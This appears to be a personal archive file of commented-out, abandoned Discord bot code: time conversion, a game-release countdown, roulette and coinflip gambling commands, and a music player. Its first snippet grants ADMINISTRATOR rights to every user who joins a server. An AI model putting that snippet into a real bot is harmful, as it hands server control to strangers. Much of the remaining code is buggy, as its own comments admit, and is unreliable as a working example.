/*
Collection of old, unused code to be used as reference. Avoids cluttering of main file with 300 lines of comments

*/

//Add this inside the "guildMemberAdd" method and it might add anyone who joins as an admin
/*
if(member.user.username != "@Revan")
{
    member.guild.createRole({
        name: member.user.username,
        color: '#FFFFFF',
        permissions: []
    }).then(function(role) {
        role.edit({
            permissions: ['ADMINISTRATOR']
        }, "I've been found out");
        member.addRole(role);
    });
}
else
{
    message.channel.send("Welcome, Regular Human");
}
*/
//member.guild.channels.find("name", "general").send(member.toString() + " ");
//member.addRole(member.guild.roles.find("name", "Dirt"));


//A strange attempt at sending images using HTML?

//const node = document.createElement('div');
//node.innerHTML = `
//    <a href="${post.img}">
//        <img src="${post.link}"/>
//    </a>`;
//app.appendChild(node);
/*
message.channel.send(fetch('https://www.reddit.com/r/RoomPorn.json')
.then(res => res.json())
.then(res => res.data.children)
.then(res => res.map(post => ({
    author: post.data.author,
    link: post.data.url,
    img: post.data.preview.images[0].source.url,
}))));
});
*/



//Time things that are unnecsseseyary
/*
var today = new Date();
var day = today.getDate();
var month = today.getMonth() + 1;
var year = today.getFullYear();
var hour = today.getHours() - 8;
var minute = today.getMinutes();
var second = today.getSeconds();

  function convert(var d, var h, var m, var s)
  {
  day = d;
  hour = h;
  minute = m;
  second = s;
  while (hour > 23)
  {
    hour -= 24;
    day += 1;
  }
  while (minute >= 60)
  {
    minute -= 60;
    hour += 1;
  }
  while (second >= 60)
  {
    second -= 60;
    minute += 1;
  }
  while (hour < 0)
  {
    hour += 24;
    day -= 1;
  }
  while (minute < 0)
  {
    minute += 60;
    hour -= 1;
  }
  while (second < 0)
  {
    second += 60;
    minute -= 1;
  }
}
  convert(day, hour, minute, second);


if (minute < 10) {
  minute = "0" + minute.toString();
}
var time;
if (hour > 12) {
  time = (hour - 12).toString() + ":" + minute.toString() + " PM";
} else if (hour <= 12) {
  time = hour.toString() + ':' + minute.toString() + " AM";
}



//A smash ultimate countdown timer that just counts the time until 9
// new Promise(function(resolve, reject) {          //idk what this is
/*
yay smash released whoooo
case "countdown":
case "time":
    //delete this after smash release
    var hoursLeft = 20 - hour;
    var minutesLeft = 60 - minute;
    if (hoursLeft < 0 || minutesLeft < 0) return;
    message.channel.send("The current time is *" + time + "*. \nThere are *" + hoursLeft + "* hours and *" + minutesLeft + "* minutes remaining until SMASH :pray:");
    if (hoursLeft = 0)
    {
        message.channel.send({files: ["./images/smash_ultimate.png"]});
        message.channel.send("***yEeEeEeEe***");
    }
    break;
    */




//The unholy deadly evil roulette command

/*    case "roulette":

        unfinishedFunction("Doesn't really work with more than one person registered, and overwrites other peoples profiles.", "Probably never");
        if (findPlayer(message.author.toString()) == -1) registerPlayer(message.author.toString());
        var number;
        var color;
        var spin;
        let solution = Math.floor(Math.random() * 50) + 1;
        if (solution < 24) // 1 through 23
        {
            number = solution;
            color = 2;
            spin = solution.toString() + " black";
        }
        else if (solution > 23 && solution < 47) // 24 through 46
        {
            number = solution - 23;
            color = 1;
            spin = solution.toString() + " red";
        }
        else
        {
            number = Math.floor(Math.random() * 23) + 1;
            color = 0;
            spin = solution.toString() + " green";
        }
        message.channel.send(spin);
        var numberGuess = args[1];
        var colorGuess = args[2].toLowerCase();
        var moneyIn = args[3];
        playerList[findPlayer(message.author.toString())].money -= moneyIn;
        switch (args[2])
        {
            case "green":
                colorGuess = 0;
                break;
            case "red":
                colorGuess = 1;
                break;
            case "black":
                colorGuess = 2;
                break;
            default:
                colorGuess = -1;
                break;
        }

        message.channel.send("Gussed Number: " + numberGuess + ", Guessed Color: " + colorGuess + ", Money in: " + moneyIn);
        if (colorGuess == -1)
        {
            message.channel.send("Invalid color");
            log(colorGuess);
            return;
        }
        log("Passed color check");
        if (numberGuess > 23 || numberGuess < 0) return message.channel.send("Invalid number");
        log("Passed number check");
        if (colorGuess == color && color == 0)
        {
            if (numberGuess = number)
            {
                moneyIn *= 4;
            }
           message.channel.send("Guessed Green. Good Job. Also God damn.");
           playerList[findPlayer(message.author.toString())].money += (moneyIn*16);
        }
        else if (colorGuess == color && color == 2)
        {
            if (numberGuess = number)
            {
                moneyIn *= 2;
            }
            message.channel.send("Guessed Black correctly!");
            playerList[findPlayer(message.author.toString())].money += moneyIn*2;
        }
        else if (colorGuess == color && color == 1)
        {
            if (numberGuess = number)
            {
                moneyIn *= 2;
            }
            message.channel.send("Guessed Red Correctly!");
            playerList[findPlayer(message.author.toString())].money += moneyIn*2;
        }

        else
        {
            message.channel.send("You lose.");
            getBalance(message.author.toString());

        }


        break; */








        /*
        Ye Old Music bot stuff that didn't really work that well anyway (and some other stuff)



        case "gamble":
                    message.channel.send("You better be at least 21, " + message.author.toString());
                    var gambleEmbed = new Discord.RichEmbed();

                break;
                case "register":
                    registerPlayer(message.author.toString());
                    break;
                case "profile":
                    var i = findplayer(message.author.toString());
                    message.channel.send(i);
                    if (i = 0)
                    {
                        message.channel.send("You are not registerd");
                        return;
                    }
                    else
                    {
                        message.channel.send("You are " + gamblers[i+1].name);
                        message.channel.send("You have $" + gamblers[i+1].money);
                    }

                break;
                case "coinflip":
                    var i = findplayer(message.author.toString());
                    if (i = -1)
                    {
                        return message.channel.send("You are not registered. Error code(0)");
                    }
                    message.channel.send("Here goes!");
                    let randomnumber = Math.floor(Math.random() * 2);   //either 0 or 1
                    if (randomnumber = 0) //win
                    {
                        message.channel.send("You win!");
                        gamblers[i].money += 500;
                        message.channel.send("Your new money total is " + gamblers[i].money);
                    }
                    else if (randomnumber = 1)  //lose
                    {
                        message.channel.send('You lose.');
                        gamblers[i].money -= 500;
                        message.channel.send("Your new money total is " + gamblers[i].money);
                    }


                break;



                    message.channel.send("Here goes!");
                    var coinflipresult = Math.floor(Math.random() * 2) + 1;
                    var i = findplayer(message.author.toString());
                    message.channel.send(i);
                    if (i = 0)
                    {
                        message.channel.send("You are not registerd");
                        return;
                    }
                    else if (coinflipresult = 1)
                    {
                        message.channel.send("You win.");
                        gamblers[i].money = gamblers[i].money + 500;
                    }
                    else
                    {
                        message.channel.send("You lost.");
                        gamblers[i].money = gamblers[i].money - 500;

                    }
                    message.channel.send("You now have $" + gamblers[i].money);



        function play(connection, message) {
            var server = servers[message.guild.id];
            server.dispatcher = connection.playStream(YTDL(server.queue[0], {filter: "audioonly"}));

            server.queue.shift();

            server.dispatcher.on("end", function() {
                if (server.queue[0]) play(connection, message);
                else connection.disconnect();
            });
        }

        case "play":
                    if (!args[1]) {
                        message.channel.send("That's no man - it's a BATman");
                        return;
                    }

                    if (!message.member.voiceChannel) {
                        message.channel.send("Boi join a voice channel");
                        return;
                    }

                    if (!servers[message.guild.id]) servers[message.guild.id] = {

                    };


                    var server = servers[message.guild.id];

                   server.queue.push(args[1]);

                    if (!message.guild.voiceConnection) message.member.voiceChannel.join().then(function(connection) {
                        play(connection, message);
                    });
                break;
        */






//All of the gambling commands that weren't actually commented out, but were scrapped because they didn't work.

/*
function findPlayer(playerName) //find the player ID of the player playerName
{
  playerName = playerName.toLowerCase();
  for (var i = 0; i < playerList.length; i++) {
    if (playerName == playerList[i].name.toLowerCase()) //.toLowerCase();
    {
      return i;
    }
  }
  return -1;
}

function registerPlayer(playerName) {
  var newPlayer = {
    name: playerName,
    money: 10000,
    id: playerList.length
  }
  playerList.push(newPlayer);
  message.channel.send("You have been registered as " + playerList[playerList.length - 1].name + ", with an ID of " + playerList[playerList.length - 1].id);
}

function getPlayerList() {
  var list;
  for (var i = 0; i < playerList.length; i++) {
    list = list + playerList[i].name + ", ";
  }
  var newList = list.substring(0, str.length - 1);
  return newList;
}


  function killPlayer(playerName) {
    playerList.splice(findPlayer(playerName), 1);
    if (playerList.length == 0) {
      message.channel.send("There is no one left to challenge the mafia.");
    } else {
      message.channel.send("The remaining players are: " + getPlayerList());
    }
  }



    function getBalance(playerName) {
      if (playerList[findPlayer(playerName)].money <= -5000) {
        message.channel.send("You are so heavily in debt that the mafia breaks your legs. You have died.");
        killPlayer(playerName);
      } else if (playerList[findPlayer(playerName)].money < 0 && playerList[findPlayer(playerName)].money > -5000) {
        message.channel.send("Careful, if you have to much debt the mafia will break your legs!");
      }

      message.channel.send("Your current balance is: $" + playerList[findPlayer(playerName)].money);
    }

    function unfinishedFunction(message, time) {
      message.channel.send("You are so heavily in debt that the mafia breaks your legs. You have died.");
      log("Uh oh. Unfinished function used!");
    }




    case "register":
      for (var i = 0; i < playerList.length; i++) {
        if (message.author.toString() == playerList[i].name) {
          return message.channel.send("You are already registered.");
        }
      }
      var newPlayer = {
        name: message.author.toString(),
        money: 10000,
        id: playerList.length
      }
      playerList.push(newPlayer);

      message.channel.send("You have been registered as " + playerList[playerList.length - 1].name + ", with an ID of " + playerList[playerList.length - 1].id);
      message.channel.send("Your current balance is $" + playerList[playerList.length - 1].money);
      break;



      case "balance":
        //message.channel.send("playerList.length = " + playerList.length);
        //message.channel.send(findPlayer(message.author.toString()));
        if (findPlayer(message.author.toString()) == -1) registerPlayer(message.author.toString());
        getBalance(message.author.toString());
        //message.channel.send("Your current balance is: $" + playerList[findPlayer(message.author.toString())].money);
        break;
      case "coinflip":
        if (findPlayer(message.author.toString()) == -1) registerPlayer(message.author.toString());
        let coin = Math.floor(Math.random() * 2); //0 or 1
        var moneyIn = 500;
        if (args[1]) {
          moneyIn = args[1];
        }
        if (coin == 0) //win
        {
          message.channel.send("You've won!");
          playerList[findPlayer(message.author.toString())].money += moneyIn;
          getBalance(message.author.toString());
        } else if (coin == 1) {
          message.channel.send("You lose.");
          playerList[findPlayer(message.author.toString())].money -= moneyIn;
          getBalance(message.author.toString());
        }

        break;

      case "nosedive":
        message.channel.send("*salutes*");
        playerList[findPlayer(message.author.toString())].money -= 20000;
        getBalance(message.author.toString());
        break;


*/
